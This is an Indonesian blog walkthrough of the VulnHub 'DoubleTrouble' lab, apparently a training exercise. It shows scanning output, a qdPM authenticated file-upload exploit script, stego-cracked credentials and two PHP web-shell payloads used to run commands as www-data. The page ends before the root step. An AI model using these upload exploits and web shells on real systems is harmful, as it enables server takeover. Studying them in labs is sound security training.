<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>VulnHub: DoubleTrouble | sharpicx</title>
<meta name="generator" content="Jekyll v4.3.1" />
<meta property="og:title" content="VulnHub: DoubleTrouble" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Mesin dengan kategori easy dari sebuah open community yaitu VulnHub dengan menjalankan nmap lalu melihat eksploitasi yang tercantum dan mencoba menjalankan script yang menarik dari hasil pencarian searchsploit. ditambah, mencari credentials dari image jpg. dan login menggunakan credentials tersebut, memasang revshell dan masuk ke sistem lalu menjalankan sudo -l untuk abusing ke root." />
<meta property="og:description" content="Mesin dengan kategori easy dari sebuah open community yaitu VulnHub dengan menjalankan nmap lalu melihat eksploitasi yang tercantum dan mencoba menjalankan script yang menarik dari hasil pencarian searchsploit. ditambah, mencari credentials dari image jpg. dan login menggunakan credentials tersebut, memasang revshell dan masuk ke sistem lalu menjalankan sudo -l untuk abusing ke root." />
<link rel="canonical" href="http://localhost:4000/vh-doubletrouble" />
<meta property="og:url" content="http://localhost:4000/vh-doubletrouble" />
<meta property="og:site_name" content="sharpicx" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-11-16T00:00:00+07:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="VulnHub: DoubleTrouble" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-11-16T00:00:00+07:00","datePublished":"2022-11-16T00:00:00+07:00","description":"Mesin dengan kategori easy dari sebuah open community yaitu VulnHub dengan menjalankan nmap lalu melihat eksploitasi yang tercantum dan mencoba menjalankan script yang menarik dari hasil pencarian searchsploit. ditambah, mencari credentials dari image jpg. dan login menggunakan credentials tersebut, memasang revshell dan masuk ke sistem lalu menjalankan sudo -l untuk abusing ke root.","headline":"VulnHub: DoubleTrouble","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/vh-doubletrouble"},"url":"http://localhost:4000/vh-doubletrouble"}</script>
<!-- End Jekyll SEO tag -->


<meta name="keywords" content="RCE,awk" />

<link rel="shortcut icon" href="/favicon.ico" />
<link rel="apple-touch-icon" href="/favicon.ico"/>
<link rel="alternate" type="application/rss+xml" title="sharpicx - linux & cybersecurity big fan " href="/feed.xml" />
<link rel="stylesheet" type="text/css" href="/assets/css/base.css" />
<link rel="stylesheet" type="text/css" href="/assets/css/highlight.css" />
<!-- <link rel="stylesheet" href="https://hackerthemes.com/bootstrap-themes/demo/theme-machine/neon-glow/css/bootstrap4-neon-glow.min.css"> -->
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">

<!--[if lt IE 9]>
  <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
<![endif]-->


<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async ></script>


<script src="/assets/script/jekyllpaper.js" async ></script>
<script src="https://unpkg.com/mermaid@8.5.1/dist/mermaid.min.js" onload="javascript:loadMermaid();" async></script>


</head>
<body>
  <div class="container-wrapper">
    <header class="container-header">
      <div class="header-info">
  <span class="header-info-name">sharpicx</span><br/>
  <span class="header-info-desc" style="padding-left: 25px">linux & cybersecurity big fan </span>
</div>
<nav class="header-nav">
  <ul class="header-main-nav">
  
    <li class="header-main-nav-item"><a href="/">home</a></li>
  
    <li class="header-main-nav-item"><a href="/category">categories</a></li>
  
    <li class="header-main-nav-item"><a href="/about">whoami</a></li>
  
  </ul>
</nav>

    </header>
    <main class="container-main">
      <article class="container-post">
  <div class="post-title" style="padding: 0px 0px 20px 0px">
    <h1>VulnHub: DoubleTrouble</h1>
  </div>
  <div class="post-author">
    <span>sharpicx</span>
  </div>
  <div class="post-content">
    <p>Mesin dengan kategori <code class="language-plaintext highlighter-rouge">easy</code> dari sebuah <em>open community</em> yaitu VulnHub dengan menjalankan nmap lalu melihat eksploitasi yang tercantum dan mencoba menjalankan script yang menarik dari hasil pencarian <code class="language-plaintext highlighter-rouge">searchsploit</code>. ditambah, mencari <code class="language-plaintext highlighter-rouge">credentials</code> dari image <code class="language-plaintext highlighter-rouge">jpg</code>. dan login menggunakan credentials tersebut, memasang revshell dan masuk ke sistem lalu menjalankan <code class="language-plaintext highlighter-rouge">sudo -l</code> untuk <code class="language-plaintext highlighter-rouge">abusing</code> ke root.</p>

<h2 id="nmap-scanning">nmap scanning</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4uqqKMblsYkzCZ7j1Mn8OX4iKqTf55w3nolFxM6IDIrQ7SV4JthEGqnYsiWFGY0OpwHLJ80/pnc/Ehlnub7RCGyL5gxGkGhZPKYag6RDv0cJNgIHf5oTkJOaFhRhZPDXztGlfafcVVw0Agxg3xweEVfU0GP24cb7jXq8Obu0j4bNsx7L0xbDCB1zxYwiqBRbkvRWpiQXNns/4HKlFzO19D8bCY/GXeX4IekE98kZgcG20x/zoBjMPXWXHUcYKoIVXQCDmBGAnlIdaC7IBJMNc1YbXVv7vhMRtaf/ffTtNDX0sYydBbqbubdZJsjWL0oHHK3Uwf+HlEhkO1jBZw3Aj
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDkds8dHvtrZmMxX2P71ej+q+QDe/MG8OGk7uYjWBT5K/TZR/QUkD9FboGbq1+SpCox5qqIVo8UQ+xvcEDDVKaU=
|   256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIoK0bHJ3ceMQ1mfATBnU9sChixXFA613cXEXeAyl2Y2
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: qdPM | Login
|_http-favicon: Unknown favicon MD5: B0BD48E57FD398C5DA8AE8F2CCC8D90D
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>
<p>Seperti biasa,</p>
<ul>
  <li><strong>22/TCP</strong> menunjukkan service <code class="language-plaintext highlighter-rouge">ssh</code> dengan versi <code class="language-plaintext highlighter-rouge">OpenSSH 8.9.1 Debian 10</code></li>
  <li><strong>80/TCP</strong> dengan service <code class="language-plaintext highlighter-rouge">http</code> dengan versi <code class="language-plaintext highlighter-rouge">Apache httpd 2.4.38</code> running on <code class="language-plaintext highlighter-rouge">Debian</code>.</li>
</ul>

<p>Karena penasaran dengan <code class="language-plaintext highlighter-rouge">http-title</code> saya mencoba untuk mencarinya lewat <code class="language-plaintext highlighter-rouge">public vulnerability databases</code> terkenal. yaitu <code class="language-plaintext highlighter-rouge">searchsploit</code>.</p>
<h2 id="searchsploit-checks">searchsploit checks</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via [vh/doubletrouble]
╰─ searchsploit "qdPM"
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
qdPM 7 - Arbitrary File upload                                                                                                                                                               | php/webapps/19154.py
qdPM 7.0 - Arbitrary '.PHP' File Upload (Metasploit)                                                                                                                                         | php/webapps/21835.rb
qdPM 9.1 - 'cfg[app_app_name]' Persistent Cross-Site Scripting                                                                                                                               | php/webapps/48486.txt
qdPM 9.1 - 'filter_by' SQL Injection                                                                                                                                                         | php/webapps/45767.txt
qdPM 9.1 - 'search[keywords]' Cross-Site Scripting                                                                                                                                           | php/webapps/46399.txt
qdPM 9.1 - 'search_by_extrafields[]' SQL Injection                                                                                                                                           | php/webapps/46387.txt
qdPM 9.1 - 'type' Cross-Site Scripting                                                                                                                                                       | php/webapps/46398.txt
qdPM 9.1 - Arbitrary File Upload                                                                                                                                                             | php/webapps/48460.txt
qdPM 9.1 - Remote Code Execution                                                                                                                                                             | php/webapps/47954.py
qdPM 9.1 - Remote Code Execution (RCE) (Authenticated)                                                                                                                                       | php/webapps/50175.py
qdPM 9.1 - Remote Code Execution (RCE) (Authenticated) (v2)                                                                                                                                  | php/webapps/50944.py
qdPM 9.2 - Cross-site Request Forgery (CSRF)                                                                                                                                                 | php/webapps/50854.txt
qdPM 9.2 - Password Exposure (Unauthenticated)                                                                                                                                               | php/webapps/50176.txt
qdPM &lt; 9.1 - Remote Code Execution                                                                                                                                                           | multiple/webapps/48146.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
</code></pre></div></div>
<h2 id="exploit-analyzing">exploit analyzing</h2>
<p>ada beberapa hal menarik yang ingin saya jelaskan di sini ialah dalam <code class="language-plaintext highlighter-rouge">php/webapps/47954.py</code> terdapat kode seperti yang ada di bawah</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">HOSTNAME</span><span class="p">,</span> <span class="n">EMAIL</span><span class="p">,</span> <span class="n">PASSWORD</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">HOSTNAME</span> <span class="o">+</span> <span class="s">'/index.php/login'</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">session_requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="c1">#print(result.text)
</span>    <span class="n">login_tree</span> <span class="o">=</span> <span class="n">html</span><span class="p">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
    <span class="n">authenticity_token</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">login_tree</span><span class="p">.</span><span class="n">xpath</span><span class="p">(</span><span class="s">"//input[@name='login[_csrf_token]']/@value"</span><span class="p">)))[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">'login[email]'</span><span class="p">:</span> <span class="n">EMAIL</span><span class="p">,</span> <span class="s">'login[password]'</span><span class="p">:</span> <span class="n">PASSWORD</span><span class="p">,</span> <span class="s">'login[_csrf_token]'</span><span class="p">:</span> <span class="n">authenticity_token</span><span class="p">}</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">session_requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">HOSTNAME</span> <span class="o">+</span> <span class="s">'/index.php/login'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">referer</span><span class="o">=</span><span class="n">HOSTNAME</span> <span class="o">+</span> <span class="s">'/index.php/login'</span><span class="p">))</span>
    <span class="c1"># The designated admin account does not have a myAccount page
</span>    <span class="n">account_page</span> <span class="o">=</span> <span class="n">session_requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">HOSTNAME</span> <span class="o">+</span> <span class="s">'index.php/myAccount'</span><span class="p">)</span>
    <span class="n">account_tree</span> <span class="o">=</span> <span class="n">html</span><span class="p">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">account_page</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
    <span class="n">userid</span> <span class="o">=</span> <span class="n">account_tree</span><span class="p">.</span><span class="n">xpath</span><span class="p">(</span><span class="s">"//input[@name='users[id]']/@value"</span><span class="p">)</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">account_tree</span><span class="p">.</span><span class="n">xpath</span><span class="p">(</span><span class="s">"//input[@name='users[name]']/@value"</span><span class="p">)</span>
    <span class="n">csrftoken_</span> <span class="o">=</span> <span class="n">account_tree</span><span class="p">.</span><span class="n">xpath</span><span class="p">(</span><span class="s">"//input[@name='users[_csrf_token]']/@value"</span><span class="p">)</span>
    <span class="n">req</span><span class="p">(</span><span class="n">userid</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">csrftoken_</span><span class="p">,</span> <span class="n">EMAIL</span><span class="p">,</span> <span class="n">HOSTNAME</span><span class="p">)</span>
    <span class="n">get_file</span> <span class="o">=</span> <span class="n">session_requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">HOSTNAME</span> <span class="o">+</span> <span class="s">'index.php/myAccount'</span><span class="p">)</span>
    <span class="n">final_tree</span> <span class="o">=</span> <span class="n">html</span><span class="p">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">get_file</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
    <span class="n">backdoor</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">HOSTNAME</span> <span class="o">+</span> <span class="s">"uploads/users/"</span><span class="p">)</span>
    <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">dateStamp</span> <span class="o">=</span> <span class="s">"1970-01-01 00:00"</span>
    <span class="n">backdoorFile</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">backdoor</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">):</span>
        <span class="n">count</span> <span class="o">=</span> <span class="n">count</span> <span class="o">+</span> <span class="mi">1</span>
        <span class="k">if</span> <span class="s">"backdoor.php"</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">line</span><span class="p">):</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">start</span> <span class="o">=</span> <span class="s">"</span><span class="se">\"</span><span class="s">right</span><span class="se">\"</span><span class="s">"</span>
                <span class="n">end</span> <span class="o">=</span> <span class="s">" &lt;/td"</span>
                <span class="n">line</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
                <span class="n">dateStampNew</span> <span class="o">=</span> <span class="n">line</span><span class="p">[</span><span class="n">line</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="n">start</span><span class="p">)</span><span class="o">+</span><span class="mi">8</span><span class="p">:</span><span class="n">line</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="n">end</span><span class="p">)]</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">dateStampNew</span> <span class="o">&gt;</span> <span class="n">dateStamp</span><span class="p">):</span>
                    <span class="n">dateStamp</span> <span class="o">=</span> <span class="n">dateStampNew</span>
                    <span class="k">print</span><span class="p">(</span><span class="s">"The DateStamp is "</span> <span class="o">+</span> <span class="n">dateStamp</span><span class="p">)</span>
                    <span class="n">backdoorFile</span> <span class="o">=</span> <span class="n">line</span><span class="p">[</span><span class="n">line</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="s">"href"</span><span class="p">)</span><span class="o">+</span><span class="mi">6</span><span class="p">:</span><span class="n">line</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="s">"php"</span><span class="p">)</span><span class="o">+</span><span class="mi">3</span><span class="p">]</span>
            <span class="k">except</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">"Exception occurred"</span><span class="p">)</span>
                <span class="k">continue</span>
        <span class="c1">#print(backdoor)
</span>    <span class="k">print</span><span class="p">(</span><span class="s">'Backdoor uploaded at - &gt; '</span> <span class="o">+</span> <span class="n">HOSTNAME</span> <span class="o">+</span> <span class="s">'uploads/users/'</span> <span class="o">+</span> <span class="n">backdoorFile</span> <span class="o">+</span> <span class="s">'?cmd=whoami'</span><span class="p">)</span>
</code></pre></div></div>
<p>dalam variable <code class="language-plaintext highlighter-rouge">url</code> sudah dipastikan bahwa POST request akan dikirimkan ke <code class="language-plaintext highlighter-rouge">/index.php/login</code> dengan banyak <code class="language-plaintext highlighter-rouge">payload</code> untuk autentikasi seperti password dan username.</p>

<blockquote>
  <p>berarti saya harus mendapatkan credentialsnya terlebih dahulu</p>
</blockquote>

<p>lalu, kalau sudah mendapatkan <code class="language-plaintext highlighter-rouge">credentials</code> akan dilanjutkan untuk mengirim <code class="language-plaintext highlighter-rouge">session requests</code>. karena saya ingin mencoba manual untuk memahami konsep kode tersebut berjalan (bukan karena tidak tahu cara memakai automasi) dengan sempurna sampai ke titik variable <code class="language-plaintext highlighter-rouge">get_file</code> yang merujuk pada url <code class="language-plaintext highlighter-rouge">/index.php/myAccount</code> untuk melakukan injeksi seperti variable <code class="language-plaintext highlighter-rouge">backdoor</code> jelaskan. dalam fungsi <code class="language-plaintext highlighter-rouge">req</code> dengan beberapa parameternya yaitu <code class="language-plaintext highlighter-rouge">userid</code>, <code class="language-plaintext highlighter-rouge">username</code>, <code class="language-plaintext highlighter-rouge">csrftoken_</code>, <code class="language-plaintext highlighter-rouge">EMAIL</code> dan <code class="language-plaintext highlighter-rouge">HOSTNAME</code> ada hal menarik yang perlu dilihat.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">req</span><span class="p">(</span><span class="n">userid</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">csrftoken_</span><span class="p">,</span> <span class="n">EMAIL</span><span class="p">,</span> <span class="n">HOSTNAME</span><span class="p">):</span>
    <span class="n">request_1</span> <span class="o">=</span> <span class="n">multifrm</span><span class="p">(</span><span class="n">userid</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">csrftoken_</span><span class="p">,</span> <span class="n">EMAIL</span><span class="p">,</span> <span class="n">HOSTNAME</span><span class="p">,</span> <span class="s">'.htaccess'</span><span class="p">)</span>
    <span class="n">new</span> <span class="o">=</span> <span class="n">session_requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">HOSTNAME</span> <span class="o">+</span> <span class="s">'index.php/myAccount/update'</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">request_1</span><span class="p">)</span>
    <span class="n">request_2</span> <span class="o">=</span> <span class="n">multifrm</span><span class="p">(</span><span class="n">userid</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">csrftoken_</span><span class="p">,</span> <span class="n">EMAIL</span><span class="p">,</span> <span class="n">HOSTNAME</span><span class="p">,</span> <span class="s">'../.htaccess'</span><span class="p">)</span>
    <span class="n">new1</span> <span class="o">=</span> <span class="n">session_requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">HOSTNAME</span> <span class="o">+</span> <span class="s">'index.php/myAccount/update'</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">request_2</span><span class="p">)</span>
    <span class="n">request_3</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">'sf_method'</span><span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="s">'put'</span><span class="p">),</span>
        <span class="s">'users[id]'</span><span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="n">userid</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]),</span>
        <span class="s">'users[photo_preview]'</span><span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="s">''</span><span class="p">),</span>
        <span class="s">'users[_csrf_token]'</span><span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="n">csrftoken_</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]),</span>
        <span class="s">'users[name]'</span><span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="n">username</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]),</span>
        <span class="s">'users[new_password]'</span><span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="s">''</span><span class="p">),</span>
        <span class="s">'users[email]'</span><span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="n">EMAIL</span><span class="p">),</span>
        <span class="s">'extra_fields[9]'</span><span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="s">''</span><span class="p">),</span>
        <span class="s">'users[photo]'</span><span class="p">:</span> <span class="p">(</span><span class="s">'backdoor.php'</span><span class="p">,</span> <span class="s">'&lt;?php if(isset($_REQUEST[</span><span class="se">\'</span><span class="s">cmd</span><span class="se">\'</span><span class="s">])){ echo "&lt;pre&gt;"; $cmd = ($_REQUEST[</span><span class="se">\'</span><span class="s">cmd</span><span class="se">\'</span><span class="s">]); system($cmd); echo "&lt;/pre&gt;"; die; }?&gt;'</span><span class="p">,</span> <span class="s">'application/octet-stream'</span><span class="p">),</span>
        <span class="p">}</span>
    <span class="n">upload_req</span> <span class="o">=</span> <span class="n">session_requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">HOSTNAME</span> <span class="o">+</span> <span class="s">'index.php/myAccount/update'</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">request_3</span><span class="p">)</span>
</code></pre></div></div>
<p>dalam array <code class="language-plaintext highlighter-rouge">request_3</code> ada <code class="language-plaintext highlighter-rouge">users[photo]</code> yang akan mengirimkan request dengan format php yang berisikan <code class="language-plaintext highlighter-rouge">RCE</code> untuk disalahgunakan. dengan begitu bisa disimpulkan dalam variable <code class="language-plaintext highlighter-rouge">upload_req</code> akan mengirimkan arguments <code class="language-plaintext highlighter-rouge">files</code> yaitu <code class="language-plaintext highlighter-rouge">requests_3</code> ke <code class="language-plaintext highlighter-rouge">/index.php/myAccount/update</code> lalu RCE akan terbentuk.</p>

<p>Dengan begitu,</p>

<p>saya tahu apa yang harus saya lakukan dalam mesin ini. Let’s get digging into the hacking phase!</p>
<h2 id="directory-brute-force">Directory Brute-force</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via [vh/doubletrouble]
╰─ cat gobuster 
/uploads              (Status: 301) [Size: 316] [--&gt; http://192.168.56.29/uploads/]
/css                  (Status: 301) [Size: 312] [--&gt; http://192.168.56.29/css/]
/template             (Status: 301) [Size: 317] [--&gt; http://192.168.56.29/template/]
/images               (Status: 301) [Size: 315] [--&gt; http://192.168.56.29/images/]
/js                   (Status: 301) [Size: 311] [--&gt; http://192.168.56.29/js/]
/sf                   (Status: 301) [Size: 311] [--&gt; http://192.168.56.29/sf/]
/core                 (Status: 301) [Size: 313] [--&gt; http://192.168.56.29/core/]
/install              (Status: 301) [Size: 316] [--&gt; http://192.168.56.29/install/]
/secret               (Status: 301) [Size: 315] [--&gt; http://192.168.56.29/secret/]
/backups              (Status: 301) [Size: 316] [--&gt; http://192.168.56.29/backups/]
/batch                (Status: 301) [Size: 314] [--&gt; http://192.168.56.29/batch/]
/server-status        (Status: 403) [Size: 278]
</code></pre></div></div>
<p>dalam directory <code class="language-plaintext highlighter-rouge">/install</code> ada hal menarik yang ingin saya jelaskan, di dalam directory tersebut ada <code class="language-plaintext highlighter-rouge">connection shock</code> yang bisa saya simpulkan kalau revshell ga perlu untuk susah payah haha.</p>

<p><img src="https://i.postimg.cc/WpXzxq9B/image.png" alt="images" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via [vh/doubletrouble]
╰─ ncat -nvlp 1337
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 192.168.56.29.
Ncat: Connection from 192.168.56.29:47330.
</code></pre></div></div>

<h2 id="whatweb-results">Whatweb results</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via [vh/doubletrouble]
╰─ cat whatweb_scan 
http://192.168.56.29 [200 OK] Apache[2.4.38], Bootstrap, Cookies[qdPM8], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.56.29], JQuery[1.10.2], PasswordField[login[password]], Script[text/javascript], Title[qdPM | Login], X-UA-Compatible[IE=edge]
</code></pre></div></div>
<p>Ya, sepertinya semua di sini sudah ditampilkan oleh nmap.</p>

<h2 id="nikto-results">Nikto results</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via [vh/doubletrouble]
╰─ nikto -host $victim | tee nikto_scan 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.29
+ Target Hostname:    192.168.56.29
+ Target Port:        80
+ Start Time:         2022-11-16 13:50:02 (GMT7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie qdPM8 created without the httponly flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x1a 0x4b402c6422300 
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.1.1/images/".
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3092: /install/: This might be interesting...
+ OSVDB-3092: /readme.txt: This might be interesting...
+ OSVDB-3268: /secret/: Directory indexing found.
</code></pre></div></div>
<p>seperti yang sudah ditampilkan oleh <code class="language-plaintext highlighter-rouge">gobuster</code>, di dalam directory <code class="language-plaintext highlighter-rouge">/secret</code> terdapat sebuah image berformat <code class="language-plaintext highlighter-rouge">jpg</code>.</p>

<p><img src="https://i.postimg.cc/D0PXN7j7/image.png" alt="images2" /></p>

<p>awalnya penasaran dan takut apakah nanti ada tingkat kesulitan lagi untuk menganalisis gambar ini? hadeh.</p>

<h2 id="image-extraction">image extraction</h2>

<p>karena dalam directory <code class="language-plaintext highlighter-rouge">secret</code> ada semacam image berformat <code class="language-plaintext highlighter-rouge">jpg</code> maka saya mencoba untuk mendownloadnya dan mencari isi file tersebut.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via [vh/doubletrouble]
╰─ wget http://$victim/secret/doubletrouble.jpg                                           
--2022-11-17 11:23:55--  http://192.168.56.29/secret/doubletrouble.jpg
Connecting to 192.168.56.29:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 82779 (81K) [image/jpeg]
Saving to: ‘doubletrouble.jpg.1’

doubletrouble.jpg.1                                     100%[==============================================================================================================================&gt;]  80.84K  --.-KB/s    in 0.004s  

2022-11-17 11:23:55 (17.8 MB/s) - ‘doubletrouble.jpg’ saved [82779/82779]
╭─ via [vh/doubletrouble]
╰─ file *jpg                                          
doubletrouble.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 501x450, components 3
╭─ via [vh/doubletrouble]
╰─ binwalk *jpg                    

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
╭─ via [vh/doubletrouble]
╰─ stegseek -xf -sf *jpg -wl ~/Desktop/rockyou.txt                                                       1 ↵
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "92camaro"         
[i] Original filename: "creds.txt".
[i] Extracting to "-sf".
</code></pre></div></div>
<p>Well, bahkan ada original filename.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via [vh/doubletrouble]
╰─ mv ./-sf creds.txt      
╭─ via [vh/doubletrouble]
╰─ cat creds.txt         
otisrush@localhost.com
otis666%
</code></pre></div></div>

<h2 id="shell-as-www-data">shell as www-data</h2>
<p>seperti yang sudah dijelaskan pada subbab <code class="language-plaintext highlighter-rouge">exploit analyzing</code> bahwasanya <code class="language-plaintext highlighter-rouge">qdPM 9.1</code> bisa dipasangi revshell pada <code class="language-plaintext highlighter-rouge">/index.php/myAccount</code> bagian list Photo karena ada <code class="language-plaintext highlighter-rouge">file attachment</code>. saya mencoba memasang RCE berformat <code class="language-plaintext highlighter-rouge">phtml</code>.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via [vh/doubletrouble]
╰─ cat *phtml   
&lt;?php system($_GET['c']); ?&gt;
</code></pre></div></div>
<p>ketika saya upload, dan saya pergi ke <code class="language-plaintext highlighter-rouge">/uploads/users/</code> untuk mencari backdoor yang saya pasang.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via [vh/doubletrouble]
╰─ curl -s 'http://192.168.56.29/uploads/users/970086-lmfao.phtml?c=id'                                                     
uid=33(www-data) gid=33(www-data) groups=33(www-data)
